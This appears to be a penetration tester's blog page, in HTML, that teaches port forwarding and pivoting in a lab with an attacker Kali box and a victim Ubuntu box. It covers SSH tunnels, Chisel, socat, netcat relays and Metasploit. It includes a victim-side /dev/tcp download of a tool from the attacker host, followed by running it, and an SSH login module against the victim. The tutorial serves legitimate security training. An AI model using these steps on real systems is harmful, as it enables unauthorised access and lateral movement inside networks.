<!DOCTYPE html>













<html lang="en"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Basic Port Forwarding Techniques" />
<meta name="author" content="Miguel Guerrero" />
<meta property="og:locale" content="en" />
<meta name="description" content="In this post we will see different port forwarding tools and techniques. To see the different examples, we will use the following fictitious scenario. Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally. The different tools that we are going to see are: SSH Chisel Socat Netcat Msfconsole / meterpreter SHH We can pivot using ssh in three different ways: SSH Local port forwarding SSH Remote port forwarding SSH Dynamic port forwarding (SOCKS) SSH Local port forwarding 1 root@kali:~$ ssh -L 9000:127.0.0.1:8000 ust@192.168.164.130 This command will make the remote web server accessible, on our localhost on port 9000. SSH Remote port forwarding 1 victim@ubuntu:~$ sudo ssh -R 9090:localhost:8000 kali@192.168.164.133 We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090. SSH Dynamic port forwarding (SOCKS) First we need to configure our proxychains file: /etc/proxychains.conf We set socks4 on port 9000. Then we run the following ssh command: 1 root@kali:~$ ssh -D 9000 victim@192.168.164.130 After that, we need to configure the proxy in our browser (in this case, using foxyproxy.) We set the Proxy Type as SOCKS4 and use the configuration we put in the proxychains.conf file. Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below. Chisel How to install and execute Chisel: Kali machine: 1 2 3 4 5 6 root@kali:~/tools$ git clone https://github.com/jpillora/chisel.git root@kali:~/tools$ cd chisel root@kali:~/tools/chisel$ go build –ldflags=“-s –w” root@kali:~/tools/chisel$ upx brute chisel root@kali:~/tools/chisel$ nc -lvnp 6666 &lt; chisel root@kali:~/tools/chisel$ ./chisel server -p 8002 -reverse -v Victim machine: 1 2 3 ust@ubuntu:~/tmp$ cat &lt; /dev/tcp/192.168.164.133/6666 &gt; chisel ust@ubuntu:~/tmp$ chmod 755 chisel ust@ubuntu:~/tmp$ ./chisel client 192.168.164.133:8002 R:127.0.0.1:8000 Then we will be able to reach the remote HTTP server in our localhost port 8000. Socat 1 2 root@kali:~/tools$ socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteport root@kali:~/tools$ socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000 Netcat 1 2 root@kali:~/tools$ mknod pivot p root@kali:~/tools$ nc -l -p 12000 0&lt;pivot | nc 192.168.164.130 8000 1&gt;pivot Msfconsole / meterpreter Use auxiliary/scanner/ssh/ssh_login module to create a session 1 2 3 4 5 6 7 8 9 root@kali:~/tools$ msfconsole msf5 use auxiliary/scanner/ssh/ssh_login msf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.164.130 msf5 auxiliary(scanner/ssh/ssh_login) &gt; set username victim msf5 auxiliary(scanner/ssh/ssh_login) &gt; set password pass msf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -l msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -u ‘id’ msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i ‘id’ Once connected, use the meterpreter session opened and do the port forwarding: 1 2 3 meterpreter &gt; portfwd -h meterpreter &gt; portfwd add -l 1234 -p 8000 -r 192.168.164.130 meterpreter &gt; portfwd list Practice If you want to practice the techniques and tools explained in this post, you can make the following hack the box machines: Granny Grandpa Vault Reddish" />
<meta property="og:description" content="In this post we will see different port forwarding tools and techniques. To see the different examples, we will use the following fictitious scenario. Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally. The different tools that we are going to see are: SSH Chisel Socat Netcat Msfconsole / meterpreter SHH We can pivot using ssh in three different ways: SSH Local port forwarding SSH Remote port forwarding SSH Dynamic port forwarding (SOCKS) SSH Local port forwarding 1 root@kali:~$ ssh -L 9000:127.0.0.1:8000 ust@192.168.164.130 This command will make the remote web server accessible, on our localhost on port 9000. SSH Remote port forwarding 1 victim@ubuntu:~$ sudo ssh -R 9090:localhost:8000 kali@192.168.164.133 We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090. SSH Dynamic port forwarding (SOCKS) First we need to configure our proxychains file: /etc/proxychains.conf We set socks4 on port 9000. Then we run the following ssh command: 1 root@kali:~$ ssh -D 9000 victim@192.168.164.130 After that, we need to configure the proxy in our browser (in this case, using foxyproxy.) We set the Proxy Type as SOCKS4 and use the configuration we put in the proxychains.conf file. Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below. Chisel How to install and execute Chisel: Kali machine: 1 2 3 4 5 6 root@kali:~/tools$ git clone https://github.com/jpillora/chisel.git root@kali:~/tools$ cd chisel root@kali:~/tools/chisel$ go build –ldflags=“-s –w” root@kali:~/tools/chisel$ upx brute chisel root@kali:~/tools/chisel$ nc -lvnp 6666 &lt; chisel root@kali:~/tools/chisel$ ./chisel server -p 8002 -reverse -v Victim machine: 1 2 3 ust@ubuntu:~/tmp$ cat &lt; /dev/tcp/192.168.164.133/6666 &gt; chisel ust@ubuntu:~/tmp$ chmod 755 chisel ust@ubuntu:~/tmp$ ./chisel client 192.168.164.133:8002 R:127.0.0.1:8000 Then we will be able to reach the remote HTTP server in our localhost port 8000. Socat 1 2 root@kali:~/tools$ socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteport root@kali:~/tools$ socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000 Netcat 1 2 root@kali:~/tools$ mknod pivot p root@kali:~/tools$ nc -l -p 12000 0&lt;pivot | nc 192.168.164.130 8000 1&gt;pivot Msfconsole / meterpreter Use auxiliary/scanner/ssh/ssh_login module to create a session 1 2 3 4 5 6 7 8 9 root@kali:~/tools$ msfconsole msf5 use auxiliary/scanner/ssh/ssh_login msf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.164.130 msf5 auxiliary(scanner/ssh/ssh_login) &gt; set username victim msf5 auxiliary(scanner/ssh/ssh_login) &gt; set password pass msf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -l msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -u ‘id’ msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i ‘id’ Once connected, use the meterpreter session opened and do the port forwarding: 1 2 3 meterpreter &gt; portfwd -h meterpreter &gt; portfwd add -l 1234 -p 8000 -r 192.168.164.130 meterpreter &gt; portfwd list Practice If you want to practice the techniques and tools explained in this post, you can make the following hack the box machines: Granny Grandpa Vault Reddish" />
<link rel="canonical" href="http://localhost:4000/posts/PortForwarding/" />
<meta property="og:url" content="http://localhost:4000/posts/PortForwarding/" />
<meta property="og:site_name" content="MikeMightHackMe" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-08T11:28:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Basic Port Forwarding Techniques" />
<meta name="twitter:site" content="@GLMicky" />
<meta name="twitter:creator" content="@Miguel Guerrero" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel Guerrero"},"dateModified":"2022-03-08T11:28:00+01:00","datePublished":"2022-03-08T11:28:00+01:00","description":"In this post we will see different port forwarding tools and techniques. To see the different examples, we will use the following fictitious scenario. Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally. The different tools that we are going to see are: SSH Chisel Socat Netcat Msfconsole / meterpreter SHH We can pivot using ssh in three different ways: SSH Local port forwarding SSH Remote port forwarding SSH Dynamic port forwarding (SOCKS) SSH Local port forwarding 1 root@kali:~$ ssh -L 9000:127.0.0.1:8000 ust@192.168.164.130 This command will make the remote web server accessible, on our localhost on port 9000. SSH Remote port forwarding 1 victim@ubuntu:~$ sudo ssh -R 9090:localhost:8000 kali@192.168.164.133 We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090. SSH Dynamic port forwarding (SOCKS) First we need to configure our proxychains file: /etc/proxychains.conf We set socks4 on port 9000. Then we run the following ssh command: 1 root@kali:~$ ssh -D 9000 victim@192.168.164.130 After that, we need to configure the proxy in our browser (in this case, using foxyproxy.) We set the Proxy Type as SOCKS4 and use the configuration we put in the proxychains.conf file. Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below. Chisel How to install and execute Chisel: Kali machine: 1 2 3 4 5 6 root@kali:~/tools$ git clone https://github.com/jpillora/chisel.git root@kali:~/tools$ cd chisel root@kali:~/tools/chisel$ go build –ldflags=“-s –w” root@kali:~/tools/chisel$ upx brute chisel root@kali:~/tools/chisel$ nc -lvnp 6666 &lt; chisel root@kali:~/tools/chisel$ ./chisel server -p 8002 -reverse -v Victim machine: 1 2 3 ust@ubuntu:~/tmp$ cat &lt; /dev/tcp/192.168.164.133/6666 &gt; chisel ust@ubuntu:~/tmp$ chmod 755 chisel ust@ubuntu:~/tmp$ ./chisel client 192.168.164.133:8002 R:127.0.0.1:8000 Then we will be able to reach the remote HTTP server in our localhost port 8000. Socat 1 2 root@kali:~/tools$ socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteport root@kali:~/tools$ socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000 Netcat 1 2 root@kali:~/tools$ mknod pivot p root@kali:~/tools$ nc -l -p 12000 0&lt;pivot | nc 192.168.164.130 8000 1&gt;pivot Msfconsole / meterpreter Use auxiliary/scanner/ssh/ssh_login module to create a session 1 2 3 4 5 6 7 8 9 root@kali:~/tools$ msfconsole msf5 use auxiliary/scanner/ssh/ssh_login msf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.164.130 msf5 auxiliary(scanner/ssh/ssh_login) &gt; set username victim msf5 auxiliary(scanner/ssh/ssh_login) &gt; set password pass msf5 auxiliary(scanner/ssh/ssh_login) &gt; exploit msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -l msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -u ‘id’ msf5 auxiliary(scanner/ssh/ssh_login) &gt; sessions -i ‘id’ Once connected, use the meterpreter session opened and do the port forwarding: 1 2 3 meterpreter &gt; portfwd -h meterpreter &gt; portfwd add -l 1234 -p 8000 -r 192.168.164.130 meterpreter &gt; portfwd list Practice If you want to practice the techniques and tools explained in this post, you can make the following hack the box machines: Granny Grandpa Vault Reddish","headline":"Basic Port Forwarding Techniques","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/PortForwarding/"},"url":"http://localhost:4000/posts/PortForwarding/"}</script>
<!-- End Jekyll SEO tag -->


  <title>Basic Port Forwarding Techniques | MikeMightHackMe
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="MikeMightHackMe">
<meta name="application-name" content="MikeMightHackMe">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  

  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
          
          <img src="
            
              /assets/images/general/logo.jpg
            
          " alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">MikeMightHackMe</a>
    </div>
    <div class="site-subtitle font-italic">Pentetration Tester, OSCP Certified</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/MikeMightHack" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/GLMicky" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['miguel.guerrero','mikemighthack.me'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Basic Port Forwarding Techniques</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->







<h1 data-toc-skip>Basic Port Forwarding Techniques</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>
    
    

    

    By
    <em>
      
        <a href="https://mikemighthack.me">Miguel Guerrero</a>
      
    </em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago"
    data-ts="1646735280"
    
      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
    
    >
  2022-03-08
</em>

      </span>

      <!-- lastmod date -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="480 words">
  <em>2 min</em> read</span>


      <!-- page views -->
      
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>In this post we will see different port forwarding tools and techniques.
To see the different examples, we will use the following fictitious scenario.</p>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310123314.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<p>Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally.</p>

<p>The different tools that we are going to see are:</p>
<ul>
  <li>SSH</li>
  <li>Chisel</li>
  <li>Socat</li>
  <li>Netcat</li>
  <li>Msfconsole / meterpreter</li>
</ul>

<h2 id="shh"><span class="mr-2">SHH</span><a href="#shh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
<p>We can pivot using ssh in three different ways:</p>
<ul>
  <li>SSH Local port forwarding</li>
  <li>SSH Remote port forwarding</li>
  <li>SSH Dynamic port forwarding (SOCKS)</li>
</ul>

<h3 id="ssh-local-port-forwarding"><span class="mr-2">SSH Local port forwarding</span><a href="#ssh-local-port-forwarding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310133017.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>      root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 9000:127.0.0.1:8000 ust@192.168.164.130
</pre></td></tr></tbody></table></code></div></div>

<p>This command will make the remote web server accessible, on our localhost on port 9000.</p>

<h3 id="ssh-remote-port-forwarding"><span class="mr-2">SSH Remote port forwarding</span><a href="#ssh-remote-port-forwarding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310132100.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>    victim@ubuntu:~<span class="nv">$ </span><span class="nb">sudo </span>ssh <span class="nt">-R</span> 9090:localhost:8000 kali@192.168.164.133
</pre></td></tr></tbody></table></code></div></div>

<p>We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090.</p>

<h3 id="ssh-dynamic-port-forwarding-socks"><span class="mr-2">SSH Dynamic port forwarding (SOCKS)</span><a href="#ssh-dynamic-port-forwarding-socks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>First we need to configure our proxychains file: <strong>/etc/proxychains.conf</strong></p>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310132643.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<p>We set socks4 on port 9000.</p>

<p>Then we run the following ssh command:</p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>    root@kali:~<span class="nv">$ </span>ssh <span class="nt">-D</span> 9000 victim@192.168.164.130
</pre></td></tr></tbody></table></code></div></div>

<p>After that, we need to configure the proxy in our browser (in this case, using foxyproxy.)</p>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310133340.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<p>We set the Proxy Type as <strong>SOCKS4</strong> and use the configuration we put in the proxychains.conf file.</p>

<p>Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below.</p>

<p><img data-src="http://localhost:4000\assets\images\tutorials\PortForwarding\20220310133601.png" alt="image-center" class="align-center" data-proofer-ignore></p>

<h2 id="chisel"><span class="mr-2">Chisel</span><a href="#chisel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>How to install and execute Chisel:</p>

<p>Kali machine:</p>
<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>root@kali:~/tools<span class="nv">$ </span>git clone https://github.com/jpillora/chisel.git
root@kali:~/tools<span class="nv">$ </span><span class="nb">cd </span>chisel
root@kali:~/tools/chisel<span class="nv">$ </span>go build –ldflags<span class="o">=</span>“-s –w”
root@kali:~/tools/chisel<span class="nv">$ </span>upx brute chisel 
root@kali:~/tools/chisel<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 6666 &lt; chisel
root@kali:~/tools/chisel<span class="nv">$ </span>./chisel server <span class="nt">-p</span> 8002 <span class="nt">-reverse</span> <span class="nt">-v</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Victim machine:</p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
